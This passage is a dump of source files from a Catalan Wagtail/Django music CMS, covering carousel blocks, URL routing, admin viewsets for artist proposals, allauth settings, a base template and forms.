+   213	        data = cache.get(key)
+   214	        if data is not None:
+   215	            return data
+   216	        data = producer()
+   217	        cache.set(key, data, timeout=timeout)
+   218	        return data
+   219	
+   220	    def _qsdict(self, request):
+
+==== 🧱 Blocks — home/blocks.py ====
+— Definicions de Block:
+3:class CarouselBlock(blocks.StructBlock):
+
+— Fragments (1–200):
+     1	from wagtail import blocks
+     2	
+     3	class CarouselBlock(blocks.StructBlock):
+     4	    section_title = blocks.CharBlock(label="Títol de secció", required=True)
+     5	    source = blocks.ChoiceBlock(
+     6	        label="Font",
+     7	        choices=[("albums", "Àlbums"), ("songs", "Cançons"), ("artists", "Artistes")],
+     8	    )
+     9	    order = blocks.CharBlock(
+    10	        label="Ordenació",
+    11	        required=False,
+    12	        help_text="Clau d'ordenació permesa (p.ex. release_desc / release_asc).",
+    13	    )
+    14	    limit = blocks.IntegerBlock(
+    15	        label="Número d’elements", default=12, min_value=1, max_value=100
+    16	    )
+    17	    # Filtres opcionals
+    18	    artist_id = blocks.CharBlock(
+    19	        label="Filtra per Artist ID (Spotify)",
+    20	        required=False,
+    21	        help_text="Per a Àlbums o Cançons",
+    22	    )
+    23	    album_id = blocks.CharBlock(
+    24	        label="Filtra per Album ID (Spotify)", required=False, help_text="Només Cançons"
+    25	    )
+    26	    subtitle_kind = blocks.ChoiceBlock(
+    27	        label="Subtítol a mostrar",
+    28	        required=False,
+    29	        choices=[
+    30	            ("", "—"),
+    31	            ("artist_names", "Noms d’artista(s)"),
+    32	            ("popularity", "Popularitat (només cançons)"),
+    33	            ("followers", "Followers (només artistes)"),
+    34	        ],
+    35	    )
+    36	
+    37	    def get_context(self, value, parent_context=None):
+    38	        ctx = super().get_context(value, parent_context)
+    39	        source = (value.get("source") or "").strip()
+    40	        order = (value.get("order") or "").strip().lower()
+    41	        limit = value.get("limit") or 12
+    42	
+    43	        # Per compatibilitzar amb la plantilla actual (que usava self.heading):
+    44	        # afegim una clau 'heading' a la StructValue.
+    45	        try:
+    46	            value["heading"] = value.get("section_title")
+    47	        except Exception:
+    48	            pass
+    49	
+    50	        # Default: llista buida
+    51	        ctx["albums"] = []
+    52	
+    53	        if source == "albums":
+    54	            from .models import CmsAlbum
+    55	
+    56	            qs = CmsAlbum.objects.all()
+    57	            if value.get("artist_id"):
+    58	                qs = qs.filter(artist_ids__contains=[value["artist_id"]])
+    59	
+    60	            # Ordenació
+    61	            if order == "release_desc":
+    62	                qs = qs.order_by("-release_date", "name")
+    63	            elif order == "release_asc":
+    64	                qs = qs.order_by("release_date", "name")
+    65	            else:
+    66	                qs = qs.order_by("-release_date", "name")
+    67	
+    68	            qs = qs[:limit]
+    69	
+    70	            # Adaptem camps a la plantilla album_grid.html
+    71	            albums = []
+    72	            for a in qs:
+    73	                artist_name = getattr(a, "artist_names_str", None)
+    74	                if not artist_name and getattr(a, "artist_names", None):
+    75	                    try:
+    76	                        artist_name = ", ".join([x for x in a.artist_names if x])
+    77	                    except Exception:
+    78	                        artist_name = None
+    79	                albums.append(
+    80	                    {
+    81	                        "id": a.id,
+    82	                        "name": a.name,
+    83	                        "image_url": a.image_url,
+    84	                        "artist_name": artist_name,
+    85	                        "release_date": a.release_date,
+    86	                        "href": f"/music/albums/{a.id}/",
+    87	                    }
+    88	                )
+    89	            ctx["albums"] = albums
+    90	
+    91	        elif source == "songs":
+    92	            # Reutilitza el grid d'àlbums per a mostrar cançons més populars
+    93	            from .models import CmsAlbum, CmsSong
+    94	
+    95	            qs = CmsSong.objects.all()
+    96	
+    97	            # Filtres opcionals
+    98	            artist_id = (value.get("artist_id") or "").strip()
+    99	            album_id = (value.get("album_id") or "").strip()
+   100	            if artist_id:
+   101	                qs = qs.filter(artist_ids__contains=[artist_id])
+   102	            if album_id:
+   103	                qs = qs.filter(album_id=album_id)
+   104	
+   105	            # Ordenació: pop_desc (defecte), pop_asc, name_asc
+   106	            if order == "pop_asc":
+   107	                qs = qs.order_by("popularity", "name")
+   108	            elif order == "name_asc":
+   109	                qs = qs.order_by("name")
+   110	            else:
+   111	                qs = qs.order_by("-popularity", "name")
+   112	
+   113	            qs = qs[:limit]
+   114	
+   115	            # Map de caràtules d'àlbum per a les cançons seleccionades
+   116	            album_ids = list({s.album_id for s in qs if s.album_id})
+   117	            album_map = {
+   118	                a.id: a.image_url for a in CmsAlbum.objects.filter(id__in=album_ids)
+   119	            }
+   120	
+   121	            subtitle_kind = (value.get("subtitle_kind") or "").strip()
+   122	            albums = []
+   123	            for s in qs:
+   124	                # Subtítol segons configuració del bloc
+   125	                if subtitle_kind == "popularity":
+   126	                    artist_name = f"pop {s.popularity}" if s.popularity is not None else ""
+   127	                elif subtitle_kind == "artist_names":
+   128	                    artist_name = s.artist_names_str or ""
+   129	                else:
+   130	                    # per defecte: noms d'artista si n'hi ha
+   131	                    artist_name = s.artist_names_str or ""
+   132	
+   133	                albums.append(
+   134	                    {
+   135	                        "id": s.id,
+   136	                        "name": s.name,  # el grid mostrarà el títol de la cançó
+   137	                        "image_url": album_map.get(s.album_id),  # caràtula de l'àlbum
+   138	                        "artist_name": artist_name,
+   139	                        "release_date": None,  # no s'usa per a cançons en el grid
+   140	                        "href": f"/music/songs/{s.id}/",
+   141	                    }
+   142	                )
+   143	            ctx["albums"] = albums
+   144	
+   145	        elif source == "artists":
+   146	            # Opcional: carrusel d'artistes (usa el mateix grid)
+   147	            from .models import CmsArtista
+   148	
+   149	            qs = CmsArtista.objects.all()
+   150	
+   151	            # Ordenació: followers_desc (defecte), followers_asc, pop_desc, pop_asc, name_asc
+   152	            if order == "followers_asc":
+   153	                qs = qs.order_by("followers", "nom")
+   154	            elif order == "pop_desc":
+   155	                qs = qs.order_by("-popularitat", "nom")
+   156	            elif order == "pop_asc":
+   157	                qs = qs.order_by("popularitat", "nom")
+   158	            elif order == "name_asc":
+   159	                qs = qs.order_by("nom")
+   160	            else:
+   161	                qs = qs.order_by("-followers", "nom")
+   162	
+   163	            qs = qs[:limit]
+   164	
+   165	            subtitle_kind = (value.get("subtitle_kind") or "").strip()
+   166	            albums = []
+   167	            for ar in qs:
+   168	                if subtitle_kind == "followers":
+   169	                    artist_name = str(ar.followers) if ar.followers is not None else ""
+   170	                else:
+   171	                    # per defecte: localitat (comarca) si està disponible
+   172	                    artist_name = (
+   173	                        f"{ar.localitat} ({ar.comarca})"
+   174	                        if ar.localitat
+   175	                        else ""
+   176	                    )
+   177	
+   178	                albums.append(
+   179	                    {
+   180	                        "id": ar.id_spotify,
+   181	                        "name": ar.nom,
+   182	                        "image_url": ar.imatge_url,
+   183	                        "artist_name": artist_name,
+   184	                        "release_date": None,
+   185	                        "href": f"/music/artists/{ar.id_spotify}/",
+   186	                    }
+   187	                )
+   188	            ctx["albums"] = albums
+   189	
+   190	        return ctx
+   191	
+   192	    class Meta:
+   193	        template = "blocks/album_grid.html"
+   194	        icon = "placeholder"
+   195	        label = "Carrusel (Nadiu)"
+
+==== 🧭 URLs principals — tqcms/urls.py ====
+     1	from django.conf import settings
+     2	from django.conf.urls.static import static
+     3	from django.contrib import admin
+     4	from django.urls import include, path, re_path
+     5	from django.views.static import serve as media_serve
+     6	from wagtail import urls as wagtail_urls
+     7	from wagtail.admin import urls as wagtailadmin_urls
+     8	from wagtail.documents import urls as wagtaildocs_urls
+     9	from django.views.generic import TemplateView, RedirectView
+    10	
+    11	
+    12	urlpatterns = [    path(
+    13	        "robots.txt",
+    14	        TemplateView.as_view(template_name="robots.txt", content_type="text/plain"),
+    15	        name="robots_txt",
+    16	    ),
+    17	    path(
+    18	        "favicon.ico",
+    19	        RedirectView.as_view(url=static("img/favicon.ico"), permanent=True),
+    20	        name="favicon",
+    21	    ),
+    22	
+    23	    path("django-admin/", admin.site.urls),
+    24	    path("admin/", include(wagtailadmin_urls)),
+    25	    path("documents/", include(wagtaildocs_urls)),
+    26	    path("accounts/", include("allauth.urls")),
+    27	]
+    28	
+    29	# En dev pot afegir rutes (quan DEBUG=True)
+    30	if settings.DEBUG:
+    31	    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
+    32	
+    33	# **CLAU**: Servir MEDIA també en producció (sempre), ABANS del catch-all de Wagtail
+    34	urlpatterns += [
+    35	    re_path(
+    36	        r"^media/(?P<path>.*)$", media_serve, {"document_root": settings.MEDIA_ROOT}
+    37	    ),  # ← AFEGIT
+    38	]
+    39	
+    40	# Catch-all de Wagtail (ha d’anar l’últim)
+    41	urlpatterns += [
+    42	    path("", include(wagtail_urls)),
+    43	]
+
+==== 🪝 Wagtail hooks — home/wagtail_hooks.py ====
+— Hooks registrats:
+8:from wagtail.snippets.models import register_snippet
+47:register_snippet(ArtistaViewSet)
+193:@hooks.register("construct_main_menu")
+
+— Contingut (1–200):
+     1	from django.contrib import messages
+     2	from django.shortcuts import redirect
+     3	from django.urls import path
+     4	from django.utils.translation import gettext_lazy as _
+     5	from wagtail import hooks
+     6	from wagtail.admin.menu import MenuItem
+     7	from wagtail.admin.viewsets.model import ModelViewSet
+     8	from wagtail.snippets.models import register_snippet
+     9	from wagtail.snippets.views.snippets import SnippetViewSet
+    10	
+    11	from .models import CmsArtista, PendingArtist
+    12	
+    13	
+    14	class ArtistaViewSet(SnippetViewSet):
+    15	    model = CmsArtista
+    16	
+    17	    add_to_admin_menu = True
+    18	    menu_label = "Artistes"
+    19	    menu_icon = "user"
+    20	    icon = "user"
+    21	
+    22	    list_display = ("nom", "territori", "comarca", "localitat", "popularitat")
+    23	    search_fields = ("nom", "territori", "comarca", "localitat", "popularitat")
+    24	    list_per_page = 50
+    25	
+    26	    # — llistat: tots els artistes per a staff/superusers; no filtrem per usuari
+    27	    def get_queryset(self, request):
+    28	        return super().get_queryset(request)
+    29	
+    30	    # — controlem capacitat de crear/editar/esborrar
+    31	    def has_add_permission(self, request):
+    32	        # ningú no crea directament; s'ha de passar per "PendingArtist"
+    33	        return request.user.is_superuser
+    34	
+    35	    def has_edit_permission(self, request, obj=None):
+    36	        # Permís nadiu de Django: superuser o qui tinga 'home.change_cmsartista'
+    37	        return request.user.is_superuser or request.user.has_perm(
+    38	            "home.change_cmsartista"
+    39	        )
+    40	
+    41	    def has_delete_permission(self, request, obj=None):
+    42	        # Esborrar artista: només superuser (seguretat)
+    43	        return request.user.is_superuser
+    44	
+    45	
+    46	# Registre del snippet via funció (recomanat en 6.x)
+    47	register_snippet(ArtistaViewSet)
+    48	
+    49	
+    50	class PendingArtistViewSet(ModelViewSet):
+    51	    """
+    52	    Proposta d’artista. Els usuaris amb grup Artistes/Representants poden crear-ne.
+    53	    Superuser pot aprovar/denegar. En aprovar:
+    54	      - crea CmsArtista si no existeix (amb camps mínims)
+    55	    """
+    56	
+    57	    model = PendingArtist
+    58	    add_to_admin_menu = True
+    59	    menu_label = _("Propostes d’artista")
+    60	    menu_icon = "plus"
+    61	
+    62	    list_display = (
+    63	        "nom",
+    64	        "id_spotify",
+    65	        "territori",
+    66	        "comarca",
+    67	        "localitat",
+    68	        "user",
+    69	        "status",
+    70	        "wants_management",
+    71	        "manage_status",
+    72	        "created_at",
+    73	    )
+    74	    list_filter = ("status", "territori")
+    75	    search_fields = ("nom", "id_spotify", "user__username", "user__email")
+    76	    inspect_view_enabled = True
+    77	
+    78	    form_fields = [
+    79	        "id_spotify",
+    80	        "nom",
+    81	        "territori",
+    82	        "comarca",
+    83	        "localitat",
+    84	        "wants_management",  # <- el “vull gestionar”
+    85	        "note",
+    86	    ]
+    87	
+    88	    def before_create(self, request, instance):
+    89	        if not instance.user_id:
+    90	            instance.user = request.user
+    91	        if not getattr(instance, "status", None):
+    92	            instance.status = "pending"
+    93	
+    94	    def get_queryset(self, request):
+    95	        qs = super().get_queryset(request)
+    96	        if request.user.is_superuser:
+    97	            return qs
+    98	        # Veuen només les seues propostes
+    99	        return qs.filter(user=request.user)
+   100	
+   101	    def has_list_permission(self, request):
+   102	        return True
+   103	
+   104	    def has_create_permission(self, request):
+   105	        # Només qui ja té accés a admin; si vols, ací pots acotar a grups
+   106	        return True
+   107	
+   108	    def has_edit_permission(self, request, obj=None):
+   109	        if request.user.is_superuser:
+   110	            return True
+   111	        return (
+   112	            obj is not None
+   113	            and obj.user_id == request.user.id
+   114	            and obj.status == "pending"
+   115	        )
+   116	
+   117	    def has_delete_permission(self, request, obj=None):
+   118	        if request.user.is_superuser:
+   119	            return True
+   120	        return (
+   121	            obj is not None
+   122	            and obj.user_id == request.user.id
+   123	            and obj.status == "pending"
+   124	        )
+   125	
+   126	    def get_admin_urls_for_registration(self):
+   127	        return super().get_admin_urls_for_registration() + [
+   128	            path("approve/<int:pk>/", self.approve_view, name="pendingartist_approve"),
+   129	            path("deny/<int:pk>/", self.deny_view, name="pendingartist_deny"),
+   130	        ]
+   131	
+   132	    def _user_in_group(self, user, group_name: str) -> bool:
+   133	        return user.groups.filter(name=group_name).exists()
+   134	
+   135	    def approve_view(self, request, pk, *args, **kwargs):
+   136	        if not request.user.is_superuser:
+   137	            messages.error(request, _("No tens permisos per aprovar."))
+   138	            return redirect(self.index_url)
+   139	
+   140	        from .models import CmsArtista
+   141	
+   142	        try:
+   143	            pa = PendingArtist.objects.get(pk=pk)
+   144	        except PendingArtist.DoesNotExist:
+   145	            messages.error(request, _("Proposta no trobada."))
+   146	            return redirect(self.index_url)
+   147	
+   148	        # Si l’artista no existeix, el creem amb els camps mínims
+   149	        artista, created = CmsArtista.objects.get_or_create(
+   150	            pk=pa.id_spotify,
+   151	            defaults={
+   152	                "id_spotify": pa.id_spotify,
+   153	                "nom": pa.nom,
+   154	                "territori": pa.territori,
+   155	                "comarca": pa.comarca,
+   156	                "localitat": pa.localitat,
+   157	            },
+   158	        )
+   159	
+   160	        pa.status = "approved"
+   161	        pa.save(update_fields=["status"])
+   162	
+   163	        if created:
+   164	            messages.success(
+   165	                request,
+   166	                _("Proposta aprovada: s'ha creat l'artista."),
+   167	            )
+   168	        else:
+   169	            messages.success(
+   170	                request,
+   171	                _("Proposta aprovada."),
+   172	            )
+   173	
+   174	        return redirect(self.index_url)
+   175	
+   176	    def deny_view(self, request, pk, *args, **kwargs):
+   177	        if not request.user.is_superuser:
+   178	            messages.error(request, _("No tens permisos per denegar."))
+   179	            return redirect(self.index_url)
+   180	
+   181	        try:
+   182	            pa = PendingArtist.objects.get(pk=pk)
+   183	        except PendingArtist.DoesNotExist:
+   184	            messages.error(request, _("Proposta no trobada."))
+   185	            return redirect(self.index_url)
+   186	
+   187	        pa.status = "denied"
+   188	        pa.save(update_fields=["status"])
+   189	        messages.info(request, _("Proposta denegada."))
+   190	        return redirect(self.index_url)
+   191	
+   192	
+   193	@hooks.register("construct_main_menu")
+   194	def add_quick_pendingartist_button(request, menu_items):
+   195	    if request.user.is_superuser:
+   196	        return
+   197	    menu_items.append(
+   198	        MenuItem(
+   199	            _("➕ Proposar artista"),
+   200	            "/admin/pending_artists/",
+
+==== 👤 Registre / Login (Allauth) — settings & vistes ====
+— Ajustos allauth (settings):
+INSTALLED_APPS = ['home', 'wagtail.contrib.forms', 'wagtail.contrib.redirects', 'wagtail.embeds', 'wagtail.sites', 'wagt\
+ail.users', 'wagtail.snippets', 'wagtail.documents', 'wagtail.images', 'wagtail.search', 'wagtail.admin', 'wagtail', 'mo\
+delcluster', 'taggit', 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.ses\
+sions', 'django.contrib.messages', 'django.contrib.staticfiles', 'wagtail.contrib.settings', 'django.contrib.sites', 'al\
+lauth', 'allauth.account', 'allauth.socialaccount', 'allauth.socialaccount.providers.google', 'allauth.socialaccount.pro\
+viders.instagram', 'allauth.socialaccount.providers.spotify']
+AUTHENTICATION_BACKENDS = ('django.contrib.auth.backends.ModelBackend', 'allauth.account.auth_backends.AuthenticationBac\
+kend')
+LOGIN_REDIRECT_URL = /
+ACCOUNT_AUTHENTICATION_METHOD = username_email
+ACCOUNT_EMAIL_REQUIRED = True
+ACCOUNT_EMAIL_VERIFICATION = mandatory
+home/views_signup.py no trobat (potser useu only-urls/templates).
+
+— Plantilles allauth personalitzades:
+
+==== 🎨 Base template — tqcms/templates/base.html ====
+     1	{% load static wagtailcore_tags wagtailsettings_tags wagtailimages_tags wagtailuserbar l10n navigation_tags %}
+     2	
+     3	<!DOCTYPE html>
+     4	<html lang="ca">
+     5	 <head>
+     6	 <meta charset="utf-8" />
+     7	 <title>
+     8	 {% block title %}
+     9	 {% wagtail_site as current_site %}
+    10	 {% if page %}
+    11	 {% if page.seo_title %}{{ page.seo_title }}{% else %}{{ page.title }}{% endif %}
+    12	 {% else %}
+    13	 {{ current_site.site_name }}
+    14	 {% endif %}
+    15	 {% endblock %}
+    16	 </title>
+    17	 {% if page and page.search_description %}
+    18	 <meta name="description" content="{{ page.search_description }}" />
+    19	 {% endif %}
+    20	 <meta name="viewport" content="width=device-width, initial-scale=1" />
+    21	
+    22	 {# Force all links in the live preview panel to be opened in a new tab #}
+    23	 {% if request.in_preview_panel %}
+    24	 <base target="_blank">
+    25	 {% endif %}
+    26	
+    27	 {# Global stylesheets #}
+    28	 <link rel="stylesheet" type="text/css" href="{% static 'css/tqcms.css' %}">
+    29	
+    30	 {% block extra_css %}
+    31	 {% endblock %}
+    32	 
+    33	 {# ——— Carrega Google Fonts si la família triada ho necessita ——— #}
+    34	 {% with s=settings.home.SiteDesign %}
+    35	 {% if s.font_family in "inter roboto merriweather" %}
+    36	 <link rel="preconnect" href="https://fonts.googleapis.com">
+    37	 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    38	 {% if s.font_family == "inter" %}
+    39	 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    40	 {% elif s.font_family == "roboto" %}
+    41	 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    42	 {% elif s.font_family == "merriweather" %}
+    43	 <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700&display=swap" rel="stylesheet">
+    44	 {% endif %}
+    45	 {% endif %}
+    46	 {% endwith %}
+    47	
+    48	 {# ——— Favicon i apple-touch-icon des de SiteDesign.favicon ——— #}
+    49	 {% with s=settings.home.SiteDesign %}
+    50	 {% if s.favicon %}
+    51	 {# 180x180 per iOS #}
+    52	 {% image s.favicon max-180x180 as ico180 %}
+    53	 <link rel="apple-touch-icon" sizes="180x180" href="{{ ico180.url }}">
+    54	
+    55	 {# 32x32 clàssic #}
+    56	 {% image s.favicon max-32x32 as ico32 %}
+    57	 <link rel="icon" type="image/png" sizes="32x32" href="{{ ico32.url }}">
+    58	
+    59	 {# 16x16 fallback #}
+    60	 {% image s.favicon max-16x16 as ico16 %}
+    61	 <link rel="icon" type="image/png" sizes="16x16" href="{{ ico16.url }}">
+    62	 {% endif %}
+    63	 {% endwith %}
+    64	
+    65	 {% with s=settings.home.SiteDesign %}
+    66	 {% localize off %}
+    67	 <style id="tq-brand">
+    68	 :root{
+    69	 /* ——— Colors (SiteDesign) ——— */
+    70	 --brand: {{ s.brand|default:"#0047FF" }};
+    71	 --text: {{ s.text|default:"#111111" }};
+    72	 {# Accent/enllaç: si no hi ha link, fa fallback a brand #}
+    73	 --bg: {{ s.background|default:"#FFFFFF" }};
+    74	 --border: #dddddd;
+    75	 --danger: #c00;
+    76	
+    77	 {# Header: per defecte empra fons/text generals #}
+    78	 --header-bg: var(--bg);
+    79	 --header-text: var(--text);
+    80	 --header-h: {{ s.header_height|default:96 }}px;
+    81	
+    82	 {# Footer: per defecte és “invertit”: fons marca + text on-brand #}
+    83	 --footer-bg: var(--brand);
+    84	 --footer-text: var(--bg);
+    85	
+    86	 /* ——— Maquetació ——— */
+    87	 --container-max: {{ s.container_max_width|default:1180 }}px;
+    88	 --gutter: {{ s.container_gutter|default:16 }}px;
+    89	 --logo-w: {{ s.logo_width|default:200 }}px;
+    90	 --logo-h: {{ s.logo_height|default:60 }}px;
+    91	
+    92	
+    93	 /* ——— Tipografia ——— */
+    94	 {% comment %}
+    95	 Mapegem font_family (choices) a stacks segurs. Si no hi ha elecció, fem fallback a body_font o a system-ui.
+    96	 {% endcomment %}
+    97	 {% if s.font_family == "inter" %}
+    98	 --body-font:"Inter", system-ui, -apple-system,"Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    99	 {% elif s.font_family == "roboto" %}
+   100	 --body-font: Roboto, system-ui, -apple-system,"Segoe UI", Helvetica, Arial, sans-serif;
+   101	 {% elif s.font_family == "merriweather" %}
+   102	 --body-font:"Merriweather", Georgia,"Times New Roman", serif;
+   103	 {% elif s.font_family == "system" %}
+   104	 --body-font: system-ui, -apple-system,"Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+   105	 {% elif s.body_font %}
+   106	 --body-font: {{ s.body_font }};
+   107	 {% else %}
+   108	 --body-font: system-ui, -apple-system,"Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+   109	 {% endif %}
+   110	
+   111	 --font-base: {{ s.base_font_size_px|default:16 }}px;
+   112	 --font-scale: {{ s.scale_ratio|default:1.25 }};
+   113	 }
+   114	
+   115	 html, body{
+   116	 color: var(--text);
+   117	 background: var(--bg);
+   118	 font-family: var(--body-font);
+   119	 font-size: var(--font-base);
+   120	 }
+   121	
+   122	 /* Escalat dels títols amb la relació definida */
+   123	 h1{ font-size: calc(var(--font-base) * (var(--font-scale) * var(--font-scale) * var(--font-scale))); line-height\
+:1.2; }
+   124	 h2{ font-size: calc(var(--font-base) * (var(--font-scale) * var(--font-scale))); line-height:1.25; }
+   125	 h3{ font-size: calc(var(--font-base) * var(--font-scale)); line-height:1.3; }
+   126	 h4{ font-size: calc(var(--font-base) * 1.05); }
+   127	 h5{ font-size: var(--font-base); }
+   128	 h6{ font-size: calc(var(--font-base) * 0.95); }
+   129	 </style>
+   130	 {% endlocalize %}
+   131	 {% endwith %}
+   132	
+   133	
+   134	 </head>
+   135	
+   136	 <body class="{% block body_class %}{% endblock %}">
+   137	 {% wagtailuserbar %}
+   138	
+   139	 <header class="site-header">
+   140	 <div class="container site-nav">
+   141	 <div class="site-header__nav-left">
+   142	 {% with s=settings.home.SiteDesign %}
+   143	  {% if s.logo %}
+   144	    {% image s.logo max-320x120 as r %}
+   145	    <img class="site-logo" src="{{ r.url }}" alt="{{ s.site_name|default:'Top Quaranta' }}">
+   146	    {% if s.show_site_name %}<span class="fw-800 fs-18">{{ s.site_name|default:'Top Quaranta' }}</span>{% endif %\
+}
+   147	  {% else %}
+   148	    {% if s.show_site_name %}<span class="fw-800 fs-18">{{ s.site_name|default:'Top Quaranta' }}</span>{% endif %\
+}
+   149	  {% endif %}
+   150	{% endwith %}
+   151	 </div>
+   152	 <div class="site-header__nav-right">
+   153	 {% wagtail_site as current_site %}
+   154	 {% get_main_menu as main_menu %}
+   155	<nav class="nav-menu" aria-label="Seccions">
+   156	  {% if main_menu %}
+   157	    {% for item in main_menu.items.all %}
+   158	      <div class="menu-item">
+   159	        {% with u=item.resolved_url %}
+   160	          <a href="{{ u }}"
+   161	            class="{% if request.path == u %}is-active{% endif %}"
+   162	            {% if item.new_tab %}target="_blank" rel="noopener"{% endif %}>
+   163	            {{ item.label }}
+   164	          </a>
+   165	        {% endwith %}
+   166	        {% if item.children.all %}
+   167	          <ul class="nav-menu__submenu">
+   168	            {% for c in item.children.all %}
+   169	              <li>
+   170	                {% with u=c.resolved_url %}
+   171	                  <a href="{{ u }}"
+   172	                    class="{% if request.path == u %}is-active{% endif %}"
+   173	                    {% if c.new_tab %}target="_blank" rel="noopener"{% endif %}>
+   174	                    {{ c.label }}
+   175	                  </a>
+   176	                {% endwith %}
+   177	              </li>
+   178	            {% endfor %}
+   179	          </ul>
+   180	        {% endif %}
+   181	      </div>
+   182	    {% endfor %}
+   183	  {% else %}
+   184	    {# Fallback a l’estructura actual (arbre) si no hi ha snippet definit #}
+   185	    {% with menu_pages=current_site.root_page.get_children.live.in_menu %}
+   186	      {% if menu_pages %}
+   187	        {% for p in menu_pages %}
+   188	          <div class="menu-item">
+   189	            <a href="{{ p.url }}" class="{% if request.path == p.url %}is-active{% endif %}">{{ p.title }}</a>
+   190	            {% with children=p.get_children.live.in_menu %}
+   191	              {% if children %}
+   192	                <ul class="nav-menu__submenu">
+   193	                  {% for c in children %}
+   194	                    <li><a href="{{ c.url }}">{{ c.title }}</a></li>
+   195	                  {% endfor %}
+   196	                </ul>
+   197	              {% endif %}
+   198	            {% endwith %}
+   199	          </div>
+   200	        {% endfor %}
+   201	      {% else %}
+   202	        <a href="/">Inici</a>
+   203	        {% if user.is_authenticated %}
+   204	          <a href="/admin/">Panell</a>
+   205	          <a href="{% url 'account_logout' %}">Tancar sessió</a>
+   206	        {% else %}
+   207	          <a href="/admin/">Entrar</a>
+   208	          <a href="{% url 'account_signup' %}">Registrar-se</a>
+   209	        {% endif %}
+   210	      {% endif %}
+   211	    {% endwith %}
+   212	  {% endif %}
+   213	</nav>
+   214	
+   215	 <button class="search-toggle" aria-label="Obrir cerca">🔍</button>
+   216	
+   217	<div class="menu-item">
+   218	  <a href="/admin/" class="user-link tq-link-plain tq-fs-18">
+   219	  👤
+   220	</a>
+   221	</div>
+   222	
+   223	 </div>
+   224	 </div>
+   225	 <div class="search-panel">
+   226	 <form class="container" action="/search/" method="get">
+   227	 <input type="search" name="q" placeholder="Cerca…">
+   228	 <button type="submit">Cercar</button>
+   229	 </form>
+   230	 </div>
+   231	 </header>
+   232	
+   233	 <main>
+   234	 <div class="container">
+   235	 {% block content %}{% endblock %}
+   236	 </div>
+   237	 </main>
+   238	
+   239	
+   240	 {% wagtail_site as current_site %}
+   241	 <footer class="site-footer">
+   242	 <div class="container">
+   243	 <small>&copy; {% now "Y" %} {{ current_site.site_name }}</small>
+   244	 </div>
+   245	 </footer>
+   246	
+   247	 {# Global javascript #}
+   248	 <script type="text/javascript" src="{% static 'js/tqcms.js' %}"></script>
+   249	
+   250	 {% block extra_js %}
+   251	 {# Override this in templates to add extra javascript #}
+   252	 {% endblock %}
+   253	 </body>
+   254	</html>
+
+==== 🧩 Snippets (models marcats amb @register_snippet) ====
+Cap referència a snippets trobada.
+
+— Fitxers amb @register_snippet (capçalera 1–160):
+
+==== 🧾 Templates — índex general ====
+Carpeta templates no trobada
+
+==== 🧾 Templates — blocks/*.html (1–160 c/u) ====
+No hi ha templates/blocks
+
+==== 🧾 Templates — home/*.html (1–200 c/u) ====
+No hi ha templates/home
+
+==== 🧾 Templates — includes/*.html (1–160 c/u) ====
+No hi ha templates/includes
+
+==== 🧾 Templates — snippets/*.html (1–160 c/u) ====
+No hi ha templates/snippets
+
+==== 🧾 Templates — account/*.html (Allauth) (1–160 c/u) ====
+No hi ha templates d'account personalitzades
+
+==== 🏷️ templatetags personalitzats ====
+---- home/templatetags/__init__.py (1–160) ----
+---- home/templatetags/navigation_tags.py (1–160) ----
+     1	from django import template
+     2	from wagtail.models import Site
+     3	from home.models import MainMenu
+     4	
+     5	register = template.Library()
+     6	
+     7	@register.simple_tag(takes_context=True)
+     8	def get_main_menu(context):
+     9	    """
+    10	    Retorna el MainMenu del 'Site' actual, o None si no n'hi ha (fallback).
+    11	    """
+    12	    request = context.get("request")
+    13	    site = Site.find_for_request(request) if request else None
+    14	    if not site:
+    15	        return None
+    16	    try:
+    17	        return (MainMenu.objects
+    18	                .select_related("site")
+    19	                .prefetch_related("items__children")
+    20	                .get(site=site))
+    21	    except MainMenu.DoesNotExist:
+    22	        return None
+
+==== 📝 Forms rellevants (home/forms.py 1–220) ====
+     1	from django import forms
+     2	
+     3	from .models import CmsArtista
+     4	
+     5	
+     6	class CmsArtistaForm(forms.ModelForm):
+     7	    class Meta:
+     8	        model = CmsArtista
+     9	        # Incloem els camps que ja tenies + els 4 que volem obligar
+    10	        fields = [
+    11	            "nom",
+    12	            "generes",
+    13	            "territori",
+    14	            "comarca",
+    15	            "localitat",
+    16	            "dones",
+    17	            "agencia",
+    18	            "web",
+    19	            "viquipedia",
+    20	            "instagram",
+    21	            "youtube",
+    22	            "tiktok",
+    23	            "soundcloud",
+    24	            "bandcamp",
+    25	            "deezer",
+    26	            "bluesky",
+    27	            "myspace",
+    28	            "email",
+    29	            "telefon",
+    30	            "id_viasona",
+    31	            "bio",
+    32	        ]
+    33	
+    34	    def __init__(self, *args, **kwargs):
+    35	        super().__init__(*args, **kwargs)
+    36	        # ✅ ACI els fem obligatoris al formulari
+    37	        for f in ["nom", "localitat", "comarca", "territori"]:
+    38	            self.fields[f].required = True
+    39	
+    40	    # (opcional però recomanat) Evita valors en blanc/després d'espais
+    41	    def clean_nom(self):
+    42	        v = (self.cleaned_data.get("nom") or "").strip()
+    43	        if not v:
+    44	            raise forms.ValidationError("El camp «nom» és obligatori.")
+    45	        return v
+    46	
+    47	    def clean_localitat(self):
+    48	        v = (self.cleaned_data.get("localitat") or "").strip()
+    49	        if not v:
+    50	            raise forms.ValidationError("El camp «localitat» és obligatori.")
+    51	        return v
+    52	
+    53	    def clean_comarca(self):
+    54	        v = (self.cleaned_data.get("comarca") or "").strip()
+    55	        if not v:
+    56	            raise forms.ValidationError("El camp «comarca» és obligatori.")
+    57	        return v
+    58	
+    59	    def clean_territori(self):
+    60	        v = (self.cleaned_data.get("territori") or "").strip()
+    61	        if not v:
+    62	            raise forms.ValidationError("El camp «territori» és obligatori.")
+    63	        return v
+
+==== 🛠️ Management commands (llistat i capçalera) ====
+No s'han trobat management commands
+
+==== 🧱 Admin ModelAdmin/Model definitions (resum) ====
+No s'han trobat registres d'admin específics.
+
+— Capçaleres de possibles arxius d'admin.py:
+
+==== 🧾 Altres templates útils (search/*.html, tags/*.html, 1–160) ====
+
+==== 🗃️ Arxius de configuració de Wagtail/Django addicionals ====
